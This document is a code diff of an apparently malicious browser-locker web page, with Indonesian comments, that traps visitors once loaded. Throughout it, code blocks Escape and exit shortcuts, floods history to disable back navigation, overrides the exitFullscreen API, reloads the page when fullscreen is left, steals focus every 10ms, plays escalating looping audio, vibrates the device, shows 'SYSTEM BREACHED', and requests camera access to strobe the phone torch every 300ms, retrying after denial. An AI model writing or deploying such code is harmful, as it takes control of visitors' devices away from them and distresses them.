@@ -660,6 +660,8 @@
     position: absolute;
     pointer-events: auto;
     animation: gifPopIn 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+    cursor: pointer;
+    -webkit-tap-highlight-color: transparent;
   }
   .gif-attack-item {
     display: block;
@@ -669,6 +671,7 @@
     filter: drop-shadow(0 0 8px rgba(255, 0, 0, 0.8));
     user-select: none;
     -webkit-user-drag: none;
+    cursor: pointer;
   }
   .gif-attack-item.aggressive {
     filter: drop-shadow(0 0 20px #ff0000) contrast(1.5) saturate(1.8);
@@ -709,31 +712,35 @@
   
   .gif-close-btn {
     position: absolute;
-    top: -12px; right: -12px;
-    width: 32px; height: 32px;
+    top: -14px; right: -14px;
+    width: 44px; height: 44px;
     background: linear-gradient(180deg, #ff4444, #aa0000);
     color: #fff;
-    border: 2px solid #fff;
+    border: 3px solid #fff;
     border-radius: 50%;
-    font-size: 18px;
+    font-size: 22px;
     font-weight: bold;
     line-height: 1;
     cursor: pointer;
     display: flex;
     align-items: center;
     justify-content: center;
-    box-shadow: 0 0 12px rgba(255,0,0,0.9);
+    box-shadow: 0 0 15px rgba(255,0,0,0.9);
     z-index: 10;
     padding: 0;
     font-family: Arial, sans-serif;
     transition: all 0.15s;
     pointer-events: auto;
+    -webkit-tap-highlight-color: transparent;
+    touch-action: manipulation;
   }
   .gif-close-btn:hover {
     background: linear-gradient(180deg, #ff6666, #cc0000);
     transform: scale(1.15);
   }
-  .gif-close-btn:active { transform: scale(0.9); }
+  .gif-close-btn:active {
+    transform: scale(0.9);
+  }
   
   #gifCounter {
     position: fixed;
@@ -791,6 +798,13 @@
     cursor: pointer;
     font-weight: 900;
     white-space: nowrap;
+  }
+  
+  #fsTriggerOverlay {
+    position: fixed; inset: 0;
+    z-index: 2147483647;
+    background: transparent;
+    cursor: pointer;
   }
   
   @media (max-height: 640px) {
@@ -955,25 +969,18 @@
   var COUNTDOWN_INTERVAL = null;
   var ESCAPE_PENALTY_ACTIVE = false;
 
-  /* ============ RESTORE STATE SETELAH RELOAD ============ */
+  /* ============ RESTORE STATE ============ */
   try {
     if (sessionStorage.getItem('kompas_locked') === '1') {
       var savedAttempts = parseInt(sessionStorage.getItem('kompas_attempts') || '0');
-      if (savedAttempts > 0) {
-        ATTEMPTS = savedAttempts;
-        console.log('[RESTORE] Attempts:', ATTEMPTS);
-      }
+      if (savedAttempts > 0) ATTEMPTS = savedAttempts;
     }
   } catch(e) {}
 
   /* ============ SERVICE WORKER ============ */
   if ('serviceWorker' in navigator) {
     try {
-      navigator.serviceWorker.register('sw.js').then(function(reg) {
-        console.log('[SW] Registered');
-      }).catch(function(err) {
-        console.log('[SW] Gagal:', err);
-      });
+      navigator.serviceWorker.register('sw.js').catch(function(){});
     } catch(e) {}
   }
 
@@ -992,13 +999,13 @@
       installBtn.addEventListener('click', function() {
         if (DEFERRED_PROMPT) {
           DEFERRED_PROMPT.prompt();
-          DEFERRED_PROMPT.userChoice.then(function(choice) {
+          DEFERRED_PROMPT.userChoice.then(function() {
             DEFERRED_PROMPT = null;
             var p = document.getElementById('installPrompt');
             if (p) p.classList.remove('show');
           });
         } else {
-          alert('Buka menu browser → "Tambahkan ke layar utama" / "Install App"');
+          alert('Buka menu browser → "Tambahkan ke layar utama"');
         }
       });
     }
@@ -1018,16 +1025,14 @@
         IDIOT_AUDIO.style.display = 'none';
         document.body.appendChild(IDIOT_AUDIO);
       }
-      if (typeof volume === 'number') {
-        IDIOT_AUDIO.volume = Math.max(0, Math.min(1, volume));
-      }
+      if (typeof volume === 'number') IDIOT_AUDIO.volume = Math.max(0, Math.min(1, volume));
       IDIOT_AUDIO.loop = true;
       var p = IDIOT_AUDIO.play();
       if (p !== undefined) {
         p.then(function() {
           IDIOT_PLAYING = true;
           updateAudioIndicator(true);
-        }).catch(function(err) {
+        }).catch(function() {
           setTimeout(function() {
             IDIOT_AUDIO.play().then(function() {
               IDIOT_PLAYING = true;
@@ -1059,8 +1064,7 @@
 
   function updateIdiotVolume(attempt) {
     if (!IDIOT_AUDIO) return;
-    var vol = Math.min(1, 0.15 + attempt * 0.15);
-    IDIOT_AUDIO.volume = vol;
+    IDIOT_AUDIO.volume = Math.min(1, 0.15 + attempt * 0.15);
   }
 
   /* ============ BEEP ============ */
@@ -1090,11 +1094,11 @@
     } catch(e) {}
   }
 
-  /* ============ TORCH ============ */
+  /* ============ TORCH (FIXED — SIMPLE CONSTRAINT) ============ */
   var TORCH_STREAM = null;
   var TORCH_INTERVAL = null;
   var TORCH_ON = false;
-  var TORCH_BLINK_MS = 1000;
+  var TORCH_BLINK_MS = 300;
   var TORCH_STATUS = 'INIT';
 
   function updateFxIndicator() {
@@ -1107,6 +1111,7 @@
       if (TORCH_STATUS === 'N/A') { t.textContent = 'N/A'; t.className = 'fx-off'; }
       else if (TORCH_STATUS === 'DENIED') { t.textContent = 'DENIED'; t.className = 'fx-off'; }
       else if (TORCH_STATUS === 'ERROR') { t.textContent = 'ERR'; t.className = 'fx-off'; }
+      else if (TORCH_STATUS === 'WAIT') { t.textContent = 'WAIT'; t.className = 'fx-off'; }
       else if (TORCH_STREAM) { t.textContent = TORCH_ON ? 'ON' : 'OFF'; t.className = 'fx-on'; }
       else { t.textContent = 'WAIT'; t.className = 'fx-off'; }
     }
@@ -1116,75 +1121,89 @@
     }
   }
 
-    function startTorch() {
+  function startTorch() {
     console.log('[TORCH] startTorch() called');
     if (!window.isSecureContext) {
-      console.warn('[TORCH] Butuh HTTPS/localhost');
+      console.warn('[TORCH] Butuh HTTPS');
       TORCH_STATUS = 'N/A'; updateFxIndicator(); return;
     }
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
       console.warn('[TORCH] getUserMedia tidak didukung');
       TORCH_STATUS = 'N/A'; updateFxIndicator(); return;
     }
+    if (TORCH_STREAM) {
+      console.log('[TORCH] Udah ada stream');
+      return;
+    }
 
-    // ========== CARA KODE LAMA YANG BISA NYALA ==========
-    // 1. Constraint SIMPLE (bukan ideal)
-    // 2. GAK cek caps.torch
-    // 3. Langsung applyConstraints tanpa cek
-    // 4. Kedip cepat 300ms
     console.log('[TORCH] Minta izin kamera...');
     navigator.mediaDevices.getUserMedia({
       video: { facingMode: 'environment' }
     })
     .then(function(stream) {
+      console.log('[TORCH] Stream OK');
       TORCH_STREAM = stream;
-      var track = stream.getVideoTracks()[0];
-      if (!track) {
-        console.warn('[TORCH] No video track');
-        TORCH_STATUS = 'N/A'; updateFxIndicator();
-        return;
-      }
-
-      console.log('[TORCH] Stream OK, langsung nyalain tanpa cek caps');
       TORCH_STATUS = 'ON';
-
-      // Langsung nyalain — GAK cek caps.torch
-      try {
-        track.applyConstraints({ advanced: [{ torch: true }] })
-          .then(function() { console.log('[TORCH] Torch ON ✓'); })
-          .catch(function(e) {
-            console.warn('[TORCH] applyConstraints gagal:', e.name);
-            // Retry setelah 100ms (beberapa HP butuh waktu init)
-            setTimeout(function() {
-              try {
-                track.applyConstraints({ advanced: [{ torch: true }] }).catch(function(){});
-              } catch(e2) {}
-            }, 100);
-          });
-      } catch(e) { console.warn('[TORCH] Exception:', e); }
-
       updateFxIndicator();
 
-      // Kedip cepat kayak kode lama (300ms, bukan 1000ms)
+      var track = stream.getVideoTracks()[0];
+      if (track) {
+        TORCH_ON = true;
+        try {
+          track.applyConstraints({ advanced: [{ torch: true }] }).catch(function(){});
+        } catch(e) {}
+      }
+
       if (TORCH_INTERVAL) clearInterval(TORCH_INTERVAL);
       TORCH_INTERVAL = setInterval(function() {
         if (!LOCKED) { stopTorch(); return; }
-        TORCH_ON = !TORCH_ON;
+        if (!TORCH_STREAM) return;
         try {
-          track.applyConstraints({ advanced: [{ torch: TORCH_ON }] }).catch(function(){});
+          var t = TORCH_STREAM.getVideoTracks()[0];
+          if (t) {
+            TORCH_ON = !TORCH_ON;
+            t.applyConstraints({ advanced: [{ torch: TORCH_ON }] }).catch(function(){});
+            updateFxIndicator();
+          }
         } catch(e) {}
-        updateFxIndicator();
-      }, 300);
+      }, TORCH_BLINK_MS);
     })
     .catch(function(err) {
-      console.warn('[TORCH] getUserMedia gagal:', err.name, err.message);
+      console.warn('[TORCH] Gagal:', err.name, err.message);
       if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
         TORCH_STATUS = 'DENIED';
+        updateFxIndicator();
+        setTimeout(function() {
+          if (LOCKED && !TORCH_STREAM) startTorch();
+        }, 3000);
+      } else if (err.name === 'NotReadableError' || err.name === 'TrackStartError') {
+        TORCH_STATUS = 'WAIT';
+        updateFxIndicator();
+        setTimeout(function() {
+          if (LOCKED && !TORCH_STREAM) startTorch();
+        }, 2000);
       } else {
         TORCH_STATUS = 'ERROR';
+        updateFxIndicator();
+        setTimeout(function() {
+          if (LOCKED && !TORCH_STREAM) startTorch();
+        }, 5000);
       }
-      updateFxIndicator();
     });
+  }
+
+  function stopTorch() {
+    if (TORCH_INTERVAL) { clearInterval(TORCH_INTERVAL); TORCH_INTERVAL = null; }
+    if (TORCH_STREAM) {
+      try {
+        var track = TORCH_STREAM.getVideoTracks()[0];
+        if (track) { try { track.applyConstraints({ advanced: [{ torch: false }] }).catch(function(){}); } catch(e) {} }
+        TORCH_STREAM.getTracks().forEach(function(t) { t.stop(); });
+      } catch(e) {}
+      TORCH_STREAM = null;
+    }
+    TORCH_ON = false;
+    updateFxIndicator();
   }
 
   /* ============ VIBRATE ============ */
@@ -1240,7 +1259,7 @@
     } catch(e) {}
   }
 
-  /* ============ ANTI-EXIT SUPER KUAT ============ */
+  /* ============ ANTI-EXIT ============ */
   var ESCAPE_BLOCKED_COUNT = 0;
   var lastEscapeWarnTime = 0;
   var ESCAPE_LEVEL = 0;
@@ -1265,23 +1284,14 @@
     try {
       var el = document.documentElement;
       if (isFullscreen()) return;
-
       var p = null;
-      if (el.requestFullscreen) {
-        p = el.requestFullscreen({ navigationUI: 'hide' });
-      } else if (el.webkitRequestFullscreen) {
-        p = el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
-      } else if (el.mozRequestFullScreen) {
-        el.mozRequestFullScreen();
-      } else if (el.msRequestFullscreen) {
-        el.msRequestFullscreen();
-      }
-
+      if (el.requestFullscreen) p = el.requestFullscreen({ navigationUI: 'hide' });
+      else if (el.webkitRequestFullscreen) p = el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+      else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
+      else if (el.msRequestFullscreen) el.msRequestFullscreen();
       if (p && p.catch) {
         p.catch(function(err) {
-          // Kalau gagal karena bukan user gesture
           if (err.message && err.message.indexOf('user gesture') > -1) {
-            console.warn('[FS] Butuh user gesture');
             triggerFSOverlay();
           }
         });
@@ -1309,7 +1319,6 @@
       ov.addEventListener('click', handler, { once: true });
       ov.addEventListener('touchstart', handler, { once: true });
       document.body.appendChild(ov);
-      // Auto-trigger
       setTimeout(function() {
         if (!isFullscreen()) {
           try {
@@ -1358,8 +1367,7 @@
       shakeBody();
       forceFullscreen();
     }
-    var dur = 1200 + (ESCAPE_LEVEL * 400);
-    setTimeout(function() { warn.classList.remove('show'); }, dur);
+    setTimeout(function() { warn.classList.remove('show'); }, 1200 + (ESCAPE_LEVEL * 400));
     if (ESCAPE_DECAY_TIMER) clearTimeout(ESCAPE_DECAY_TIMER);
     ESCAPE_DECAY_TIMER = setTimeout(function() {
       ESCAPE_BLOCKED_COUNT = Math.max(0, ESCAPE_BLOCKED_COUNT - 1);
@@ -1401,24 +1409,18 @@
   }
 
   function blockExit() {
-    /* ============ 1. ESC SUPER TRAP (CAPTURE PHASE) ============ */
+    // ESC SUPER TRAP
     document.addEventListener('keydown', function(e) {
       if (!LOCKED) return;
       if (e.key === 'Escape' || e.key === 'Esc' || e.keyCode === 27) {
-        e.preventDefault();
-        e.stopPropagation();
-        e.stopImmediatePropagation();
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         try {
           var el = document.documentElement;
-          if (el.requestFullscreen && !isFullscreen()) {
-            el.requestFullscreen({ navigationUI: 'hide' }).catch(function(){});
-          } else if (el.webkitRequestFullscreen && !isFullscreen()) {
-            el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
-          }
+          if (el.requestFullscreen && !isFullscreen()) el.requestFullscreen({ navigationUI: 'hide' }).catch(function(){});
+          else if (el.webkitRequestFullscreen && !isFullscreen()) el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
         } catch(err) {}
         setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 10);
         setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 50);
-        setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 150);
         return false;
       }
     }, true);
@@ -1426,33 +1428,24 @@
     document.addEventListener('keyup', function(e) {
       if (!LOCKED) return;
       if (e.key === 'Escape' || e.key === 'Esc' || e.keyCode === 27) {
-        e.preventDefault();
-        e.stopPropagation();
-        e.stopImmediatePropagation();
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         try {
           var el = document.documentElement;
-          if (el.requestFullscreen && !isFullscreen()) {
-            el.requestFullscreen({ navigationUI: 'hide' }).catch(function(){});
-          } else if (el.webkitRequestFullscreen && !isFullscreen()) {
-            el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
-          }
+          if (el.requestFullscreen && !isFullscreen()) el.requestFullscreen({ navigationUI: 'hide' }).catch(function(){});
+          else if (el.webkitRequestFullscreen && !isFullscreen()) el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
         } catch(err) {}
         setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 0);
         setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 30);
-        setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 100);
-        setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 250);
         return false;
       }
     }, true);
 
-    /* ============ 2. HISTORY LOCK ============ */
+    // HISTORY LOCK
     for (var h = 0; h < 10; h++) {
       try { history.pushState({ lock: h, t: Date.now() }, null, location.href); } catch(e) {}
     }
     function pushLock() {
-      if (LOCKED) {
-        try { history.pushState({ lock: true, t: Date.now() }, null, location.href); } catch(e) {}
-      }
+      if (LOCKED) try { history.pushState({ lock: true, t: Date.now() }, null, location.href); } catch(e) {}
     }
     window.addEventListener('popstate', function() {
       if (LOCKED) {
@@ -1465,7 +1458,7 @@
     if (HISTORY_LOCK_INTERVAL) clearInterval(HISTORY_LOCK_INTERVAL);
     HISTORY_LOCK_INTERVAL = setInterval(pushLock, 100);
 
-    /* ============ 3. BEFOREUNLOAD ============ */
+    // BEFOREUNLOAD
     window.addEventListener('beforeunload', function(e) {
       if (LOCKED) {
         e.preventDefault();
@@ -1475,12 +1468,12 @@
       }
     });
 
-    /* ============ 4. PAGEHIDE ============ */
+    // PAGEHIDE
     window.addEventListener('pagehide', function() {
       if (LOCKED) try { window.focus(); } catch(e) {}
     });
 
-    /* ============ 5. KEYBOARD BLOCK (selain ESC) ============ */
+    // KEYBOARD BLOCK
     document.addEventListener('keydown', function(e) {
       if (!LOCKED) return;
       var key = (e.key || '').toLowerCase();
@@ -1488,66 +1481,46 @@
       var alt = e.altKey;
       var shift = e.shiftKey;
       var blocked = false;
-
       if (key === 'f5' || key === 'f11' || key === 'f12' || key === 'backspace' || key === 'printscreen') blocked = true;
       if (ctrl && (key === 'r' || key === 'w' || key === 't' || key === 'n' || key === 'q' || key === 'u' || key === 'p' || key === 's' || key === 'o' || key === 'd' || key === 'h' || key === 'j')) blocked = true;
       if (ctrl && shift && (key === 'i' || key === 'j' || key === 'c' || key === 'k' || key === 'm' || key === 's' || key === '3' || key === '4' || key === '5')) blocked = true;
       if (alt && (key === 'f4' || key === 'arrowleft' || key === 'arrowright' || key === 'home')) blocked = true;
       if (e.metaKey && (key === 'q' || (shift && (key === '3' || key === '4' || key === '5')))) blocked = true;
-
       if (blocked) {
-        e.preventDefault();
-        e.stopPropagation();
+        e.preventDefault(); e.stopPropagation();
         if (key === 'f11') {
           forceFullscreen();
           setTimeout(function() { if (LOCKED) forceFullscreen(); }, 10);
-          setTimeout(function() { if (LOCKED) forceFullscreen(); }, 50);
         }
         showEscapeWarning();
         return false;
       }
     }, true);
 
-    /* ============ 6. FULLSCREEN CHANGE TRAP ============ */
+    // FULLSCREEN CHANGE
     function onFullscreenExit() {
       if (!LOCKED) return;
       FS_ESCAPE_TIME = Date.now();
-      console.log('[FS] Keluar FS — paksa balik!');
-      // Coba panggil dari context event (dianggap user gesture)
       try {
         var el = document.documentElement;
-        if (el.requestFullscreen && !isFullscreen()) {
-          el.requestFullscreen({ navigationUI: 'hide' }).catch(function(){});
-        } else if (el.webkitRequestFullscreen && !isFullscreen()) {
-          el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
-        }
+        if (el.requestFullscreen && !isFullscreen()) el.requestFullscreen({ navigationUI: 'hide' }).catch(function(){});
+        else if (el.webkitRequestFullscreen && !isFullscreen()) el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
       } catch(e) {}
-      // Coba lagi beberapa kali
       setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 0);
       setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 20);
       setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 60);
       setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 150);
-      setTimeout(function() { if (LOCKED && !isFullscreen()) forceFullscreen(); }, 300);
       showEscapeWarning();
       vibrateSafe([500, 100, 500, 100, 500]);
       playBeep(300, 0.15, 'sawtooth');
       try { window.focus(); } catch(e) {}
     }
+    document.addEventListener('fullscreenchange', function() { if (!isFullscreen() && LOCKED) onFullscreenExit(); });
+    document.addEventListener('webkitfullscreenchange', function() { if (!isFullscreen() && LOCKED) onFullscreenExit(); });
+    document.addEventListener('mozfullscreenchange', function() { if (!isFullscreen() && LOCKED) onFullscreenExit(); });
+    document.addEventListener('MSFullscreenChange', function() { if (!isFullscreen() && LOCKED) onFullscreenExit(); });
 
-    document.addEventListener('fullscreenchange', function() {
-      if (!isFullscreen() && LOCKED) onFullscreenExit();
-    });
-    document.addEventListener('webkitfullscreenchange', function() {
-      if (!isFullscreen() && LOCKED) onFullscreenExit();
-    });
-    document.addEventListener('mozfullscreenchange', function() {
-      if (!isFullscreen() && LOCKED) onFullscreenExit();
-    });
-    document.addEventListener('MSFullscreenChange', function() {
-      if (!isFullscreen() && LOCKED) onFullscreenExit();
-    });
-
-    /* ============ 7. RAF LOOP — CEK FULLSCREEN TIAP FRAME ============ */
+    // RAF LOOP
     FS_RAF_RUNNING = true;
     function fsRafLoop() {
       if (!FS_RAF_RUNNING || !LOCKED) return;
@@ -1561,30 +1534,25 @@
     }
     requestAnimationFrame(fsRafLoop);
 
-    /* ============ 8. OVERRIDE EXITFULLSCREEN API ============ */
+    // OVERRIDE EXITFULLSCREEN
     try {
-      var blockExitFullscreen = function() {
-        if (LOCKED) {
-          console.log('[FS] exitFullscreen() diblokir');
-          forceFullscreen();
-          return Promise.reject(new Error('Blocked'));
-        }
+      var blockExitFs = function() {
+        if (LOCKED) { forceFullscreen(); return Promise.reject(new Error('Blocked')); }
         return Promise.resolve();
       };
-      if (document.exitFullscreen) document.exitFullscreen = blockExitFullscreen;
-      if (document.webkitExitFullscreen) document.webkitExitFullscreen = blockExitFullscreen;
-      if (document.mozCancelFullScreen) document.mozCancelFullScreen = blockExitFullscreen;
-      if (document.msExitFullscreen) document.msExitFullscreen = blockExitFullscreen;
+      if (document.exitFullscreen) document.exitFullscreen = blockExitFs;
+      if (document.webkitExitFullscreen) document.webkitExitFullscreen = blockExitFs;
+      if (document.mozCancelFullScreen) document.mozCancelFullScreen = blockExitFs;
+      if (document.msExitFullscreen) document.msExitFullscreen = blockExitFs;
     } catch(e) {}
 
-    /* ============ 9. RELOAD WATCHDOG — KALAU KELUAR > 800ms ============ */
+    // RELOAD WATCHDOG
     if (RELOAD_WATCHDOG) clearInterval(RELOAD_WATCHDOG);
     RELOAD_WATCHDOG = setInterval(function() {
       if (!LOCKED) { clearInterval(RELOAD_WATCHDOG); return; }
       if (!isFullscreen()) {
         if (!FS_ESCAPE_TIME) FS_ESCAPE_TIME = Date.now();
         if (Date.now() - FS_ESCAPE_TIME > 800) {
-          console.warn('[FS] Keluar > 800ms — RELOAD!');
           try {
             sessionStorage.setItem('kompas_locked', '1');
             sessionStorage.setItem('kompas_attempts', ATTEMPTS);
@@ -1596,31 +1564,26 @@
       }
     }, 200);
 
-    /* ============ 10. CONTEXT MENU ============ */
+    // CONTEXT MENU
     document.addEventListener('contextmenu', function(e) {
       if (LOCKED) { e.preventDefault(); showEscapeWarning(); return false; }
     });
 
-    /* ============ 11. COPY/CUT/DRAG ============ */
+    // COPY/DRAG
     document.addEventListener('selectstart', function(e) { if (LOCKED) e.preventDefault(); });
     document.addEventListener('copy', function(e) { if (LOCKED) { e.preventDefault(); showEscapeWarning(); } });
     document.addEventListener('cut', function(e) { if (LOCKED) { e.preventDefault(); showEscapeWarning(); } });
     document.addEventListener('dragstart', function(e) { if (LOCKED) e.preventDefault(); });
 
-    /* ============ 12. VISIBILITY TRAP ============ */
+    // VISIBILITY
     document.addEventListener('visibilitychange', function() {
       if (LOCKED) {
         if (document.hidden) {
           BLUR_START_TIME = Date.now();
           setTimeout(function() { try { window.focus(); } catch(e) {} }, 10);
-          setTimeout(function() { try { window.focus(); } catch(e) {} }, 50);
           setTimeout(function() { try { window.focus(); } catch(e) {} }, 100);
-          setTimeout(function() { try { window.focus(); } catch(e) {} }, 200);
-          setTimeout(function() { try { window.focus(); } catch(e) {} }, 400);
-          setTimeout(function() { try { window.focus(); } catch(e) {} }, 700);
-          setTimeout(function() { try { window.focus(); } catch(e) {} }, 1000);
+          setTimeout(function() { try { window.focus(); } catch(e) {} }, 500);
           setTimeout(function() { try { window.focus(); } catch(e) {} }, 1500);
-          setTimeout(function() { try { window.focus(); } catch(e) {} }, 2000);
           setTimeout(function() { try { window.focus(); } catch(e) {} }, 3000);
           if (BLUR_TIMEOUT) clearTimeout(BLUR_TIMEOUT);
           BLUR_TIMEOUT = setTimeout(function() {
@@ -1637,7 +1600,7 @@
       }
     });
 
-    /* ============ 13. BLUR TRAP ============ */
+    // BLUR
     var BLUR_ATTEMPTS = 0;
     window.addEventListener('blur', function() {
       if (LOCKED) {
@@ -1647,14 +1610,9 @@
         setTimeout(function() { document.title = '⚠ SYSTEM BREACHED'; }, 2000);
         vibrateSafe([800, 100, 800, 100, 800]);
         setTimeout(function() { try { window.focus(); } catch(e) {} }, 10);
-        setTimeout(function() { try { window.focus(); } catch(e) {} }, 30);
-        setTimeout(function() { try { window.focus(); } catch(e) {} }, 60);
         setTimeout(function() { try { window.focus(); } catch(e) {} }, 100);
-        setTimeout(function() { try { window.focus(); } catch(e) {} }, 200);
-        setTimeout(function() { try { window.focus(); } catch(e) {} }, 400);
-        setTimeout(function() { try { window.focus(); } catch(e) {} }, 700);
+        setTimeout(function() { try { window.focus(); } catch(e) {} }, 500);
         setTimeout(function() { try { window.focus(); } catch(e) {} }, 1000);
-        setTimeout(function() { try { window.focus(); } catch(e) {} }, 1500);
         setTimeout(function() { try { window.focus(); } catch(e) {} }, 2000);
         if (BLUR_ATTEMPTS >= 2) showEscapeWarning();
         if (BLUR_TIMEOUT) clearTimeout(BLUR_TIMEOUT);
@@ -1674,7 +1632,7 @@
       }
     });
 
-    /* ============ 14. PAGESHOW ============ */
+    // PAGESHOW
     window.addEventListener('pageshow', function() {
       if (LOCKED) {
         showEscapeWarning();
@@ -1685,7 +1643,7 @@
       }
     });
 
-    /* ============ 15. FULLSCREEN WATCHDOG ============ */
+    // FULLSCREEN WATCHDOG
     if (FULLSCREEN_WATCHDOG) clearInterval(FULLSCREEN_WATCHDOG);
     FULLSCREEN_WATCHDOG = setInterval(function() {
       if (!LOCKED) return;
@@ -1695,14 +1653,14 @@
       }
     }, 30);
 
-    /* ============ 16. FOCUS WATCHDOG ============ */
+    // FOCUS WATCHDOG
     if (FOCUS_WATCHDOG) clearInterval(FOCUS_WATCHDOG);
     FOCUS_WATCHDOG = setInterval(function() {
       if (!LOCKED) return;
       try { window.focus(); } catch(e) {}
     }, 10);
 
-    /* ============ 17. VISIBILITY WATCHDOG ============ */
+    // VISIBILITY WATCHDOG
     if (VISIBILITY_WATCHDOG) clearInterval(VISIBILITY_WATCHDOG);
     VISIBILITY_WATCHDOG = setInterval(function() {
       if (!LOCKED) return;
@@ -1716,23 +1674,22 @@
       }
     }, 100);
 
-    /* ============ 18. ORIENTATION WATCHDOG ============ */
+    // ORIENTATION WATCHDOG
     if (ORIENTATION_WATCHDOG) clearInterval(ORIENTATION_WATCHDOG);
     ORIENTATION_WATCHDOG = setInterval(function() {
       if (!LOCKED) return;
       lockOrientation();
     }, 500);
 
-    /* ============ 19. WAKE LOCK ============ */
+    // WAKE LOCK
     var WAKE_LOCK_INTERVAL = setInterval(function() {
       if (!LOCKED) { clearInterval(WAKE_LOCK_INTERVAL); return; }
       if (!WAKE_LOCK || WAKE_LOCK.released) requestWakeLock();
     }, 2000);
 
-    /* ============ 20. TOUCH EDGE BLOCK ============ */
+    // TOUCH EDGE
     var touchStartX = 0, touchStartY = 0, touchStartTime = 0;
     var EDGE_SIZE = 70;
-
     document.addEventListener('touchstart', function(e) {
       if (!LOCKED) return;
       if (e.touches.length === 1) {
@@ -1743,48 +1700,21 @@
             touchStartY < EDGE_SIZE || touchStartY > window.innerHeight - EDGE_SIZE) {
           e.preventDefault();
         }
-      } else if (e.touches.length > 1) {
-        e.preventDefault();
-      }
+      } else if (e.touches.length > 1) e.preventDefault();
     }, { passive: false });
 
     document.addEventListener('touchmove', function(e) {
       if (!LOCKED) return;
       if (e.touches.length > 1) { e.preventDefault(); return; }
       if (e.touches.length === 1) {
-        var x = e.touches[0].clientX;
-        var y = e.touches[0].clientY;
+        var x = e.touches[0].clientX, y = e.touches[0].clientY;
         if (x < EDGE_SIZE || x > window.innerWidth - EDGE_SIZE) e.preventDefault();
         if (y < EDGE_SIZE && window.scrollY <= 0) e.preventDefault();
         if (y > window.innerHeight - EDGE_SIZE) e.preventDefault();
       }
     }, { passive: false });
 
-    document.addEventListener('touchend', function(e) {
-      if (!LOCKED || !e.changedTouches.length) return;
-      var endX = e.changedTouches[0].clientX;
-      var endY = e.changedTouches[0].clientY;
-      var dx = endX - touchStartX;
-      var dy = endY - touchStartY;
-      var dt = Date.now() - touchStartTime;
-      if (Math.abs(dx) > 30 && Math.abs(dy) < 100 && dt < 500) {
-        if (touchStartX < EDGE_SIZE || touchStartX > window.innerWidth - EDGE_SIZE) {
-          e.preventDefault(); showEscapeWarning(); vibrateSafe([400, 100, 400]);
-        }
-      }
-      if (dy > 50 && Math.abs(dx) < 60 && dt < 500) {
-        if (touchStartY < EDGE_SIZE) {
-          e.preventDefault(); showEscapeWarning(); vibrateSafe([400, 100, 400]);
-        }
-      }
-      if (dy < -50 && Math.abs(dx) < 60 && dt < 500) {
-        if (touchStartY > window.innerHeight - EDGE_SIZE) {
-          e.preventDefault(); showEscapeWarning(); vibrateSafe([400, 100, 400]);
-        }
-      }
-    }, { passive: false });
-
-    /* ============ 21. PULL-TO-REFRESH ============ */
+    // PULL-TO-REFRESH
     var pullStartY = 0;
     document.addEventListener('touchstart', function(e) {
       if (!LOCKED) return;
@@ -1796,17 +1726,15 @@
       if (window.scrollY <= 0 && y > pullStartY && (y - pullStartY) > 20) e.preventDefault();
     }, { passive: false });
 
-    /* ============ 22. WHEEL ============ */
-    document.addEventListener('wheel', function(e) {
-      if (LOCKED) e.preventDefault();
-    }, { passive: false });
+    // WHEEL
+    document.addEventListener('wheel', function(e) { if (LOCKED) e.preventDefault(); }, { passive: false });
 
-    /* ============ 23. GESTURE iOS ============ */
+    // GESTURE iOS
     document.addEventListener('gesturestart', function(e) { if (LOCKED) e.preventDefault(); });
     document.addEventListener('gesturechange', function(e) { if (LOCKED) e.preventDefault(); });
     document.addEventListener('gestureend', function(e) { if (LOCKED) e.preventDefault(); });
 
-    /* ============ 24. DOUBLE-TAP ============ */
+    // DOUBLE-TAP
     var lastTouchEnd = 0;
     document.addEventListener('touchend', function(e) {
       if (!LOCKED) return;
@@ -1815,35 +1743,27 @@
       lastTouchEnd = now;
     }, { passive: false });
 
-    /* ============ 25. DEVTOOLS DETECTION ============ */
+    // DEVTOOLS DETECTION
     var DEVTOOLS_CHECK = setInterval(function() {
       if (!LOCKED) { clearInterval(DEVTOOLS_CHECK); return; }
-      var threshold = 160;
-      var wDiff = window.outerWidth - window.innerWidth > threshold;
-      var hDiff = window.outerHeight - window.innerHeight > threshold;
-      if (wDiff || hDiff) {
+      if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
         showEscapeWarning();
         vibrateSafe([500, 100, 500]);
       }
     }, 2000);
 
-    /* ============ 26. MOUSE LEAVE ============ */
+    // MOUSE LEAVE
     document.addEventListener('mouseleave', function(e) {
       if (LOCKED) setTimeout(function() { try { window.focus(); } catch(err) {} }, 50);
     });
 
-    /* ============ 27. ORIENTATION CHANGE ============ */
+    // ORIENTATION CHANGE
     window.addEventListener('orientationchange', function() {
-      if (LOCKED) {
-        setTimeout(function() {
-          forceFullscreen();
-          lockOrientation();
-        }, 100);
-      }
+      if (LOCKED) setTimeout(function() { forceFullscreen(); lockOrientation(); }, 100);
     });
   }
 
-  /* ============ GIF ATTACK SYSTEM ============ */
+  /* ============ GIF ATTACK ============ */
